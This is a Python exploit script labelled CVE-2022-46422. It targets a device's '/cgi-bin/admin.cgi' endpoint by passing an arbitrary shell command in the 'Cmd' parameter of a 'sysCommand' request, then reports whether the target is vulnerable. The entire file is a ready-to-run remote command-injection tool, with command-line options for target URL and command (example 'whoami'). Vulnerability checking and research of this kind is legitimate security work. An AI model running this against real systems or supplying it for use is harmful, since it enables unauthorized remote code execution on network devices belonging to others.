import argparse
import sys
import requests
import textwrap
from xml.etree import ElementTree
requests.packages.urllib3.disable_warnings()
def main(url,cmd):
    full_url=f"{url}/cgi-bin/admin.cgi?Command=sysCommand&Cmd={cmd}"
    headers = {"Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
               "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    try:
        response = requests.get(full_url,stream=True)
        # response.encoding='u8'
        # xmlparser = ElementTree.iterparse(response.raw)
        # node = ElementTree.XML(response.text)
    except Exception:
        print(f"[-]{url}请求失败")
        sys.exit(1)
    if "CmdResult" in response.text:
        print(f'Found:{url} // ' )
    else:
        print(f"[-]{url}不存在漏洞")
if __name__ == "__main__":
    banner = "1"
    print(banner)
    parser = argparse.ArgumentParser(description="CVE--2022-46422",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
        python3 CVE--2022-46422.py -u http://192.168.0.1 -c
                                         '''))
    parser.add_argument("-u", "--url", dest="url", help="input the url,example:http:192.168.0.1")
    parser.add_argument("-c", "--cmd", dest="cmd", help="input the CMD,example:whoami")
    args = parser.parse_args()
    main(args.url,args.cmd)